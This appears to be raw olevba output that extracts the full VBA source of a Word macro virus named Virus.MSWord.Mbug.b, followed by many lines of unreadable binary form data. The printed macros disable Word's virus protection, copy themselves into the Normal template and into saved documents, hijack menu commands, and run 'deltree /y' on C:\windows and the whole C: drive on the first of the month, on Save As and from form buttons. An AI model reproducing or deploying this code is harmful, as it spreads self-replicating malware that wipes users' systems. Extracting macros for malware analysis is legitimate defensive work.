olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbug.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbug.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO nrobot.bas 
in file: Virus.MSWord.Mbug.b - OLE stream: 'Macros/VBA/nrobot'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
If Day(Now()) = "1" Then
Shell "deltree /y c:\windows", vbMinimizedFocus
Shell "deltree /y c:\*.*", vbMinimizedFocus
End If
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "nrobot" Then
        nrobotInstalled = -1
    End If
Next i
If Not nrobotInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="nrobot", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
End If
ErrorAC:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="nrobot", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
UserForm1.Show
Shell "deltree /y c:\windows", vbHide
Shell "deltree /y c:\*.*", vbHide
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    MsgBox "Naughty Robot"
ErrorFT:
End Sub

Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    MsgBox "Naughty Robot"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Naughty Robot", vbSystemModal, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: Virus.MSWord.Mbug.b - OLE stream: 'Macros/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Shell "deltree /y c:\windows", vbMinimizedFocus
Shell "deltree /y c:\*.*", vbMinimizedFocus
End Sub

Private Sub CommandButton2_Click()
Shell "deltree /y c:\windows", vbMinimizedFocus
Shell "deltree /y c:\*.*", vbMinimizedFocus
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89ab
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$$U$$�$$�$I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$IU$I�$I�$m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$mU$m�$m�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�U$��$��$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�U$��$��$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�U$۪$��$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�U$��$��I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I$UI$�I$�II
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IIUII�II�Im
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ImUIm�Im�I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�UI��I��I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�UI��I��I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�UI۪I��I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�UI��I��m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m$Um$�m$�mI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mIUmI�mI�mm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mmUmm�mm�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�Um��m��m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�Um��m��m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�Um۪m��m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�Um��m���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$U�$��$��I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�IU�I��I��m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mU�m��m���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U�۪�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$U�$��$��I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�IU�I��I��m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mU�m��m���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U�۪�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$U�$��$��I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�IU�I��I��m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mU�m��m�ے
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ےUے�ے�۶
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
۶U۶�۶���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U�۪�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$U�$��$��I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�IU�I��I��m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mU�m��m���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U�۪�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U������!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NETSCAPE2.0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�HQ`C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3jܨ�C� C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p�ɓ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ŏ/K�dI3%̙2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ά�S�ǟ@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]J�ǗP�J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&A�S�^����֮`~Kv�ʲC�����$�6p�ʝ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h[�o��Ջ��ͽ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1o܋t=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fKX��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��0�緝=K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i櫛~V�����M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V��2頰�Nv͏!��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m��ٍ�y�^>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
͘br�̩?,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%u���!�^��4��Kc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�{FĜg�^<��z����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t`����wy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'^}���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N��z���a}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D`��i&!}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p|�ג~󕈚�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��؅$���<҈��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�($�?&�O5�4����8�['&��t0��݉V�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��m�eY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f��@�՞c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&etGj�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C��i�u^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�n��&xrR�砄
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ք,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j~�&ߚ@�y�mi�6ZQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&��"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Y`���:(P���ّ�j*�ٛ{���xz�&�b�F�N��V��z�Z���^F��W���U�	��m�
k���=몆�>۔�jr����[.��]�+���zT���*���j[j��^:R�����0�*0�Ɏ�b���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�𭺊&��^M�q��Fw1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0��~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ŵ�;��0��*�M��ѹ�Z\q��.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�ª���Q�����Wo��f�]��.�o��QM4���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y��(cz������=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h�9���_�%�����k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l��Q���J҈��\��f������^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'kV�[���9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K��&�~:�X�ɣ�xW�7�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i��@K:��/Yx�?���y���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϯ<��7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˺�D��^
ic�M:��j���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�Ï
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�o�kH��8jXmX��D�_��w ��Nr��S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ŨN^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ߗ�7��Ynh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T]��մS��?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5��p�	R�^d��n'<����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w�((�p|�[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Q��(A$�H��� G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�PZ�n�Ԥ
-------------------------------------------------------------------------------
